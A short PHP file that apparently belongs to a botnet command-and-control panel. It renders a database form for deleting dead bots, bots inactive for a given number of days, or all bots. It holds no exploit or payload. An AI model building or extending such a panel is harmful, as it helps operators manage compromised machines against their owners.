<?php

if(!defined('GRANTED')) die;

$STATU = stat('../data/update.dat');
$STATD = stat('../data/deleter.dat');

echo '<table align=center width=1150 class=table style="border:1px solid #425B6A;margin-bottom:5px;" cellpadding=1 cellspacing=1>
<tr align=center><td class=table1 colspan=2>Working with the base
</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
<form method=post action="?act=dbc">
<tr>
	<td align=right width=520px>Remove the dead bots from the database
</td>
	<td><input class=button name="d1" type=submit value="&raquo;">'.(($_GET['a']==1)?(' <font color=green>Deleted</font>'):('')).'</td>
</tr>
<tr>
	<td align=right>Delete from the database bots are not active<input type=text class=text name="days" maxlength=3 style="width:30px;text-align:center;"> days</td>
	<td><input class=button name="d2" type=submit value="&raquo;">'.(($_GET['a']==2)?(' <font color=green>Deleted</font>'):('')).'</td>
</tr>
<tr>
	<td align=right>Completely remove the bots from the database
</td>
	<td><input class=button name="d3" type=submit value="&raquo;">'.(($_GET['a']==3)?(' <font color=green>Deleted</font>'):('')).'</td>
</tr>
</form>


<tr><td colspan=2>&nbsp;</td></tr>
<tr><td colspan=2>&nbsp;</td></tr>
</table>';

?>